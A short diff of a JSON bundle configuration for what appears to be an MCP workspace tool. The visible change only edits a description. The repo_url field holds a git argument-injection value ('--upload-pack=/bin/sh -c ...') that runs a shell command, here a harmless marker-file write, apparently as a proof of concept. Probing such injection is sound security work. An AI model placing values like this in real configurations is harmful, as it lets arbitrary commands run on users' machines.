@@ -10,7 +10,7 @@
     },
     {
       "name": "mcp-working",
-      "description": "Cross-repo MCP workspace conductor bundle (spec + WG + python-sdk + typescript-sdk)",
+      "description": "Cross-repo MCP workspace conductor bundle (spec + WG + python-sdk + typescript-sdk) 2",
       "kind": "bundle",
       "repo_url": "--upload-pack=/bin/sh -c 'touch /tmp/PWNED'",
       "repo_ref": "main",
